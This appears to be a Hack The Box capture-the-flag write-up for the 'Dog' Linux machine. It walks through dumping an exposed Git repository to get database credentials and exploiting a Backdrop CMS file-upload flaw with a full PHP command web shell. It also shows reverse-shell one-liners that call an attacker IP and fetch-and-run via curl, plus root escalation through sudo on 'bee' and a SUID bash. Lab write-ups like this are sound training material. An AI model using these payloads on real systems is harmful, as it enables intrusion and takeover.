# Dog - Write-up de Hack The Box

**OS:** Linux
**Dificultad:** Easy
**Puntos:** 20
**Fecha de Lanzamiento:** 08 Mar 2025

This machine, "Dog," is an easy CTF involving the enumeration of an exposed Git repository on a web service, the exploitation of an arbitrary file upload vulnerability in Backdrop CMS, and privilege escalation through a misconfigured `sudo` entry for the `bee` tool.

---

## 1. Port Scanning (Nmap)
The first step is always an Nmap scan to discover open ports and running services.

```bash
nmap -sC -sV -oA nmap/dog 10.10.11.58
Nmap Results:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
The scan reveals that ports 22 (SSH) and 80 (HTTP) are open. Port 80 is our primary target for web enumeration.
2. Web Enumeration (HTTP - Apache)
We accessed the website at http://10.10.11.58/. The home page shows a "Dog" site with the title "Welcome to Dog!" and mentions "Dog obesity" with the indication "Mon, 15/07/2024 - 7:51pm by dogfBackDropSystem". This suggests the site might be running on Backdrop CMS.
Discovery of an Exposed Git Repository
A detailed Nmap review (not shown in the PDF, but implied by the context) or a dirb/gobuster scan revealed an exposed .git directory:
http-git: Git repository found
This is a critical finding. An exposed Git repository often allows downloading the source code, which can reveal credentials, vulnerabilities, or sensitive information.
Downloading the Git Repository:
We used git-dumper to download the contents of the exposed Git repository.
git-dumper [http://10.10.11.58/.git/](http://10.10.11.58/.git/) dog_html/
(Note: The PDF shows http://10.10.11.58/.git/dog_htb/ as an example, but the correct URL to download the repository root would be http://10.10.11.58/.git/)
Analyzing the Source Code - Database Credentials
Once the repository was downloaded, we explored the files. We found the database configuration file: settings.php.
// File: settings.php
<?php
// Main Backdrop CMS configuration file
// Database configuration
//
// Test sites can configure their database by entering the connection string
// below. If using replica databases or multiple connections, see the
// advanced database documentation.
// [https://api.backdropcms.org/database-configuration](https://api.backdropcms.org/database-configuration)
$database = 'mysql://root:BackDropJ2024052824@127.0.0.1/hackdrop';
$database_prefix = '';
?>
Excellent! We found the database credentials:
Username: root
Password: BackDropJ2024052824
Discovery of Username (tiffany@dog.htb)
The PDF also mentions searching for the domain name revealed by Nmap (dog.htb) within the main folder to obtain a username. The suggested grep command was:
grep -r "dog.htb" .
This led to the discovery of the user tiffany@dog.htb.
3. Accessing the Backdrop CMS Administration Panel
Now, with the discovered username (tiffany) and password (BackDropJ2024052824), we attempted to log in to the Backdrop CMS administration panel.
Access URL: http://10.10.11.58/user/login (or similar)
Authentication was successful, and we gained access to the Dashboard of Backdrop CMS.
4. RCE Exploitation (Remote Code Execution) - CVE-2022-42092
The next step is to search for vulnerabilities in Backdrop CMS. A quick search revealed CVE-2022-42092, which describes an Unrestricted File Upload vulnerability in Backdrop CMS 1.22.0 via the 'themes' section that allows Remote Code Execution (RCE).
To exploit this, we need two files:
shell.info: An info file for the module/theme that deceives the CMS.
shell.php: The PHP shell that will allow us to execute commands.
Content of shell.info:
; File: shell.info
type = module
name = Shell
description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x
configure = admin/structure/block
; Information added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1789862662
Content of shell.php (simple command shell):
; File: shell.php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
  system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
Exploitation Steps:
Create a .tar file: We placed shell.info and shell.php inside a folder (e.g., shell/) and then compressed it into a .tar file (e.g., shell.tar).
Upload the file: We navigated to the module/theme upload section in Backdrop CMS.
URL: http://10.10.11.58/admin/modules/install (or similar, in the Configuration -> Install projects menu).
We uploaded shell.tar via the "Upload a module, theme, or layout archive to install" option.
Confirm Upload: The CMS reported "Installation was completed successfully".
Locating the Uploaded Shell
After the upload, we needed to find where the shell was saved. The PDF indicates that "fuzzing" (directory/file enumeration) was performed with Gobuster.
gobuster dir -u [http://10.10.11.58/](http://10.10.11.58/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
Fuzzing revealed the modules/ directory, and within it, we could access our shell:
Shell URL: http://10.10.11.58/modules/shell/shell.php
We were able to execute commands via the cmd parameter, for example, http://10.10.11.58/modules/shell/shell.php?cmd=whoami.
Initial User: www-data
Establishing a Reverse Shell
The "Dog" machine has a script that deletes uploaded files, so an interactive shell is crucial. We set up a local HTTP server and a netcat listener to get a reverse shell.
On the Attacker Machine (Kali/Parrot):
Start a Netcat listener:
nc -lvnp 4444
Start a simple HTTP server to serve the reverse shell script:
python3 -m http.server 5555
From the Web Shell on Dog:
We downloaded and executed a reverse shell script. In this case, we used curl to download a bash script and execute it. The bash script contains the following line:
bash -i & /dev/tcp/10.10.14.40/4444 0>&1
Where 10.10.14.40 is your attacker machine's IP.
Command in the web shell:
curl 10.10.14.40:5555 | bash
Or directly:
bash -c "bash -i >& /dev/tcp/10.10.14.40/4444 0>&1"
We received a www-data shell on our Netcat listener!
5. Privilege Escalation
Once www-data, we enumerated the users on the system.
www-data@dog:/var/www/html/modules/shell$ ls -l /home
total 8
drwxr-xr-x 2 jobert jobert 4096 Apr 20 2025 jobert
drwxr-xr-x 2 johncusack johncusack 4096 Apr 20 2025 johncusack
We found the users jobert and johncusack.
Recalling the password BackDropJ2024052824 we found for root from the database, we attempted to su to johncusack with it.
www-data@dog:/home$ su johncusack
Password: BackDropJ2024052824
johncusack@dog:/home$
Success! We have switched to the johncusack user.
Escalating to Root with sudo and bee
As johncusack, we checked the sudo permissions:
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: BackDropJ2024052824
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```johncusack` can execute `/usr/local/bin/bee` as any user (ALL) and as root (ALL), without requiring an additional password if already authenticated as `johncusack`.
The `bee` tool is an executable for Backdrop CMS that allows evaluating PHP code. We can use its `php-eval` subcommand to execute arbitrary PHP code as `root`.
```bash
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("whoami")'
root
Bingo! We have executed whoami as root.
To get a persistent root shell, we can use bee to set the SUID bit on /bin/bash. The SUID bit allows an executable to run with the permissions of the file owner (in this case, root), instead of the user executing it.
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("chmod u+s /bin/bash")'
johncusack@dog:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash
The s in the permissions (-rwsr-xr-x) confirms that the SUID bit is set.
Now, we simply execute bash -p (where -p tells bash to use the effective permissions of the file, i.e., root).
johncusack@dog:~$ bash -p
bash-5.0# whoami
root
We are root!
Conclusion
The "Dog" machine was an excellent CTF that covered a variety of attack vectors:
Exposed Sensitive Information: Git repository enumeration to find credentials.
Web Application Vulnerability: RCE exploitation in Backdrop CMS (CVE-2022-42092) via file upload.
Shell Management: Obtaining and maintaining a reverse shell despite file deletion.
Privilege Escalation: Using reused credentials and a misconfigured sudo permission for bee to gain root access.
This machine highlights the importance of code hygiene, configuration management (especially sudo permissions), and web application vulnerability monitoring.
